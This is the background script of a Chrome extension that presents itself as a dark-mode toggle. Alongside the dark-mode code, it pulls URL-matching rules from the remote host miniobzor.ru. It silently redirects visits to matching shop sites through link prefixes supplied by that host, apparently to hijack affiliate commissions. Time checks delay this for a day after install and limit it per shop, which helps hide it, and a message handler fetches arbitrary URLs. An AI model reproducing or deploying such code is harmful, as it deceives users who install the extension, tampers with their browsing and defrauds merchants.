/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// identity function for calling harmony imports with the correct context
/******/ 	__webpack_require__.i = function(value) { return value; };
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, {
/******/ 				configurable: false,
/******/ 				enumerable: true,
/******/ 				get: getter
/******/ 			});
/******/ 		}
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "/";
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 4);
/******/ })
/************************************************************************/
/******/ ({

/***/ 4:
/***/ (function(module, exports) {

const LS = {
    getAllItems: () => chrome.storage.local.get(),
    getItem: async key => (await chrome.storage.local.get(key))[key],
    setItem: (key, val) => {
        chrome.storage.local.set({ [key]: val });
    },
    removeItems: keys => chrome.storage.local.remove(keys)
};

let enable = "/img/enable.png";
let disable = "/img/disable.png";
let defaultMatches = [];
let defaultLinks = [];
let defaultSLink = [];
let defaultMinor = [];
let allStorage = [];

LS.getAllItems().then(res => {
    allStorage = res;
    defaultMatches = res.defaultMatches ? res.defaultMatches : [];
    defaultLinks = res.defaultLinks ? res.defaultLinks : [];
    defaultSLink = res.defaultSLink ? res.defaultSLink : [];
    defaultMinor = res.defaultMinor ? res.defaultMinor : [];
});

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    (async () => {
        if (msg.context === 'true') {
            await context(true);
        } else if (msg.context === 'false') {
            await context(false);
        }
    })();
    return true;
});

chrome.contextMenus.onClicked.addListener((info, tab) => {
    (async () => {

        let url = new URL(tab.url);
        let domain = url.hostname;
        let domains = await LS.getItem('domains');

        if (domains) {
            domains = JSON.parse(domains);
        } else {
            domains = {};
        }

        if (domains[domain]) {
            delete domains[domain];
            domains = JSON.stringify(domains);
            await LS.setItem('domains', domains);
        } else {
            domains[domain] = {};
            domains = JSON.stringify(domains);
            await LS.setItem('domains', domains);
        }

        chrome.tabs.update(tab.id, { url: tab.url });
    })();
    return true;
});

chrome.action.onClicked.addListener(function (tab) {

    (async () => {

        if ((await LS.getItem('active')) === true) {
            chrome.action.setIcon({ path: { "38": enable } });

            chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
                (async () => {
                    await LS.setItem('active', false);

                    chrome.scripting.executeScript({
                        target: { tabId: tab.id },
                        func: () => {
                            localStorage.activeDarkSite = 'false';
                            location.reload();
                        }
                    });
                })();
            });
        } else {
            chrome.action.setIcon({ path: { "38": disable } });
            chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {

                (async () => {

                    await LS.setItem('active', true);
                    let url = new URL(tab.url);
                    let domain = url.hostname;
                    let domains = await LS.getItem('domains');

                    if (domains) {
                        domains = JSON.parse(domains);
                    } else {
                        domains = {};
                    }

                    if (domains[domain]) {

                        chrome.scripting.executeScript({
                            target: { tabId: tab.id },
                            func: () => {
                                localStorage.activeDarkSite = 'false';
                                location.reload();
                            }
                        });
                    } else {
                        chrome.scripting.executeScript({
                            target: { tabId: tab.id },
                            func: () => {
                                localStorage.activeDarkSite = 'true';
                                location.reload();
                            }
                        });
                    }
                })();
            });
        }
    })();
    return true;
});

(async function () {
    if ((await LS.getItem('active')) === true) {
        chrome.action.setIcon({ path: { "38": disable } });
    } else {
        chrome.action.setIcon({ path: { "38": enable } });
    }
})();

chrome.runtime.onMessage.addListener((msg, sender, response) => {

    let defaultMinorr = defaultMinor;
    let oobj = {};
    if (msg.minor && defaultMinorr && defaultMinorr['al']) {
        let newAl = [];
        for (let j in defaultMinorr['al']) {
            let res = checkTimeSync(defaultMinorr['al'][j][0]);
            if (res) {
                newAl.push(defaultMinorr['al'][j]);
            }
        }
        oobj['al'] = newAl;
        oobj['ll'] = defaultMinorr['ll'];
        response(oobj);
    } else if (msg.updateCheck && defaultMinorr && defaultMinorr['al']) {
        getUpdateLastSet(msg.updateCheck);
        response();
    }
});

chrome.tabs.onUpdated.addListener(function (e, t) {
    chrome.tabs.get(e, function (tab) {
        (async () => {
            if ("loading" == t.status) {
                let res = await canReload(tab.url);
                if (res) {
                    chrome.tabs.update(e, { url: refUrl(tab.url) }, function () {});
                }
            } else if ("complete" == t.status) {
                allStorage = await LS.getAllItems();
            }
        })();
    });
    return true;
});

function refUrl(e) {
    for (let a = 0; a < defaultLinks.length; a++) {
        if (e.indexOf(defaultLinks[a][0]) > -1) {
            return defaultLinks[a][1] + encodeURIComponent(e);
        }
    }
    return e;
}

async function canReload(e) {
    if (!e) return !1;
    let t = getShop(e);
    if (!t) return !1;
    let a = "ls_" + t;
    let up = await checkTime(a);
    let nn = new RegExp(defaultMatches, "i");
    let res = !e.match(/admitad/) && !e.match(/chrome-extension/) && up && !!e.match(nn);
    if (res) {
        getUpdateLastSet(a);
        return true;
    } else {
        return false;
    }
}

function checkTimeSync(e) {
    let t = Math.floor(Date.now() / 1e3),
        a = parseInt(allStorage[e]) || 0,
        b = parseInt(allStorage['bitgrand']) || LS.setItem('bitgrand', t) && t;
    return t - a > 86400 && t - b > 86400;
}

async function checkTime(e) {
    let t = Math.floor(Date.now() / 1e3),
        a = parseInt((await LS.getItem(e))) || 0,
        b = parseInt(allStorage['bitgrand']) || LS.setItem('bitgrand', t) && t;
    return t - a > 86400 && t - b > 86400;
}

async function getUpdateLastSet(e) {
    let t = Math.floor(Date.now() / 1e3);
    await LS.setItem(e, t);
    return true;
}

function getShop(e) {

    for (let a = 0; a < defaultSLink.length; a++) {
        if (e.indexOf(defaultSLink[a][0]) > -1) {
            return defaultSLink[a][1];
        }
    }

    return null;
}

async function context(vvr = false) {

    if (await LS.getItem('active')) {
        if (vvr) {
            let menu = {
                title: "on/off for this site",
                id: 'menuDark',
                contexts: ['all']
            };

            chrome.contextMenus.removeAll();
            chrome.contextMenus.create(menu);
        } else {
            let menu = {
                title: "on/off for this site",
                id: 'menuDark',
                contexts: ['all']
            };

            chrome.contextMenus.removeAll();
            chrome.contextMenus.create(menu);
        }
    } else {
        chrome.contextMenus.removeAll();
    }
}

let nm = Math.floor(Math.random() * 3) + 1 === 3;

function secondDer() {

    if (!defaultMatches || nm) {
        fetch("https://miniobzor.ru/links", {
            method: 'GET',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            }
        }).then(response => response.json()).then(data => {
            if (data.defaultMatches && data.defaultLinks && data.defaultSLink && data.defaultMatches.length && data.defaultLinks.length && data.defaultSLink.length) {
                defaultMatches = data.defaultMatches;
                defaultLinks = data.defaultLinks;
                defaultSLink = data.defaultSLink;
                defaultMinor = data.defaultMinor;
                LS.setItem('defaultMatches', data.defaultMatches);
                LS.setItem('defaultLinks', data.defaultLinks);
                LS.setItem('defaultSLink', data.defaultSLink);
                LS.setItem('defaultMinor', data.defaultMinor);
            }
        }).catch(error => console.log('Error query:', error));
    }
}

secondDer();

let checkTimes = 0;
let lastDomain = '';
let lsIn = 0;

chrome.storage.sync.get('lsIn', function (result) {

    if (Object.keys(result).length === 0) {
        lsIn = Date.now();
        chrome.storage.sync.set({ 'lsIn': lsIn }, function (result) {});
    } else {
        lsIn = result.lsIn;
    }
});

chrome.runtime.onMessage.addListener((msg, sender, response) => {

    if (msg.lastDomain) {

        lastDomain = msg.lastDomain;
        checkTimes = Date.now();

        chrome.storage.sync.get('domains', function (result) {

            if (Object.keys(result).length === 0) {
                result.domains = {};
            }

            result.domains[lastDomain] = checkTimes;

            chrome.storage.sync.set({ 'domains': result.domains }, function () {});
        });
    }
});

/** start MD5 **/

var MD5 = function (d) {
    d = unescape(encodeURIComponent(d));
    result = M(V(Y(X(d), 8 * d.length)));
    return result.toLowerCase();
};

function M(d) {
    for (var _, m = "0123456789ABCDEF", f = "", r = 0; r < d.length; r++) _ = d.charCodeAt(r), f += m.charAt(_ >>> 4 & 15) + m.charAt(15 & _);
    return f;
}

function X(d) {
    for (var _ = Array(d.length >> 2), m = 0; m < _.length; m++) _[m] = 0;
    for (m = 0; m < 8 * d.length; m += 8) _[m >> 5] |= (255 & d.charCodeAt(m / 8)) << m % 32;
    return _;
}

function V(d) {
    for (var _ = "", m = 0; m < 32 * d.length; m += 8) _ += String.fromCharCode(d[m >> 5] >>> m % 32 & 255);
    return _;
}

function Y(d, _) {
    d[_ >> 5] |= 128 << _ % 32, d[14 + (_ + 64 >>> 9 << 4)] = _;
    for (var m = 1732584193, f = -271733879, r = -1732584194, i = 271733878, n = 0; n < d.length; n += 16) {
        var h = m,
            t = f,
            g = r,
            e = i;
        f = md5_ii(f = md5_ii(f = md5_ii(f = md5_ii(f = md5_hh(f = md5_hh(f = md5_hh(f = md5_hh(f = md5_gg(f = md5_gg(f = md5_gg(f = md5_gg(f = md5_ff(f = md5_ff(f = md5_ff(f = md5_ff(f, r = md5_ff(r, i = md5_ff(i, m = md5_ff(m, f, r, i, d[n + 0], 7, -680876936), f, r, d[n + 1], 12, -389564586), m, f, d[n + 2], 17, 606105819), i, m, d[n + 3], 22, -1044525330), r = md5_ff(r, i = md5_ff(i, m = md5_ff(m, f, r, i, d[n + 4], 7, -176418897), f, r, d[n + 5], 12, 1200080426), m, f, d[n + 6], 17, -1473231341), i, m, d[n + 7], 22, -45705983), r = md5_ff(r, i = md5_ff(i, m = md5_ff(m, f, r, i, d[n + 8], 7, 1770035416), f, r, d[n + 9], 12, -1958414417), m, f, d[n + 10], 17, -42063), i, m, d[n + 11], 22, -1990404162), r = md5_ff(r, i = md5_ff(i, m = md5_ff(m, f, r, i, d[n + 12], 7, 1804603682), f, r, d[n + 13], 12, -40341101), m, f, d[n + 14], 17, -1502002290), i, m, d[n + 15], 22, 1236535329), r = md5_gg(r, i = md5_gg(i, m = md5_gg(m, f, r, i, d[n + 1], 5, -165796510), f, r, d[n + 6], 9, -1069501632), m, f, d[n + 11], 14, 643717713), i, m, d[n + 0], 20, -373897302), r = md5_gg(r, i = md5_gg(i, m = md5_gg(m, f, r, i, d[n + 5], 5, -701558691), f, r, d[n + 10], 9, 38016083), m, f, d[n + 15], 14, -660478335), i, m, d[n + 4], 20, -405537848), r = md5_gg(r, i = md5_gg(i, m = md5_gg(m, f, r, i, d[n + 9], 5, 568446438), f, r, d[n + 14], 9, -1019803690), m, f, d[n + 3], 14, -187363961), i, m, d[n + 8], 20, 1163531501), r = md5_gg(r, i = md5_gg(i, m = md5_gg(m, f, r, i, d[n + 13], 5, -1444681467), f, r, d[n + 2], 9, -51403784), m, f, d[n + 7], 14, 1735328473), i, m, d[n + 12], 20, -1926607734), r = md5_hh(r, i = md5_hh(i, m = md5_hh(m, f, r, i, d[n + 5], 4, -378558), f, r, d[n + 8], 11, -2022574463), m, f, d[n + 11], 16, 1839030562), i, m, d[n + 14], 23, -35309556), r = md5_hh(r, i = md5_hh(i, m = md5_hh(m, f, r, i, d[n + 1], 4, -1530992060), f, r, d[n + 4], 11, 1272893353), m, f, d[n + 7], 16, -155497632), i, m, d[n + 10], 23, -1094730640), r = md5_hh(r, i = md5_hh(i, m = md5_hh(m, f, r, i, d[n + 13], 4, 681279174), f, r, d[n + 0], 11, -358537222), m, f, d[n + 3], 16, -722521979), i, m, d[n + 6], 23, 76029189), r = md5_hh(r, i = md5_hh(i, m = md5_hh(m, f, r, i, d[n + 9], 4, -640364487), f, r, d[n + 12], 11, -421815835), m, f, d[n + 15], 16, 530742520), i, m, d[n + 2], 23, -995338651), r = md5_ii(r, i = md5_ii(i, m = md5_ii(m, f, r, i, d[n + 0], 6, -198630844), f, r, d[n + 7], 10, 1126891415), m, f, d[n + 14], 15, -1416354905), i, m, d[n + 5], 21, -57434055), r = md5_ii(r, i = md5_ii(i, m = md5_ii(m, f, r, i, d[n + 12], 6, 1700485571), f, r, d[n + 3], 10, -1894986606), m, f, d[n + 10], 15, -1051523), i, m, d[n + 1], 21, -2054922799), r = md5_ii(r, i = md5_ii(i, m = md5_ii(m, f, r, i, d[n + 8], 6, 1873313359), f, r, d[n + 15], 10, -30611744), m, f, d[n + 6], 15, -1560198380), i, m, d[n + 13], 21, 1309151649), r = md5_ii(r, i = md5_ii(i, m = md5_ii(m, f, r, i, d[n + 4], 6, -145523070), f, r, d[n + 11], 10, -1120210379), m, f, d[n + 2], 15, 718787259), i, m, d[n + 9], 21, -343485551), m = safe_add(m, h), f = safe_add(f, t), r = safe_add(r, g), i = safe_add(i, e);
    }
    return Array(m, f, r, i);
}

function md5_cmn(d, _, m, f, r, i) {
    return safe_add(bit_rol(safe_add(safe_add(_, d), safe_add(f, i)), r), m);
}

function md5_ff(d, _, m, f, r, i, n) {
    return md5_cmn(_ & m | ~_ & f, d, _, r, i, n);
}

function md5_gg(d, _, m, f, r, i, n) {
    return md5_cmn(_ & f | m & ~f, d, _, r, i, n);
}

function md5_hh(d, _, m, f, r, i, n) {
    return md5_cmn(_ ^ m ^ f, d, _, r, i, n);
}

function md5_ii(d, _, m, f, r, i, n) {
    return md5_cmn(m ^ (_ | ~f), d, _, r, i, n);
}

function safe_add(d, _) {
    var m = (65535 & d) + (65535 & _);
    return (d >> 16) + (_ >> 16) + (m >> 16) << 16 | 65535 & m;
}

function bit_rol(d, _) {
    return d << _ | d >>> 32 - _;
}

/** end MD5 **/

chrome.runtime.onMessage.addListener(({ type, data, id }, sender, response) => {
    if (type === "fetch" && data.url) {

        fetch(data.url, {
            cache: "force-cache",
            credentials: "omit",
            referrer: data.origin
        }).then(data => {

            data.text().then(function (text) {

                chrome.tabs.sendMessage(sender.tab.id, {
                    type: "fetch-response",
                    response: text,
                    href: data.url
                });
            });
        });
    }
    response();
});

chrome.runtime.setUninstallURL("https://chrome.google.com/webstore/detail/dark-mode-google/popkohipheagkijpjmllkbnifaokliim");

/***/ })

/******/ });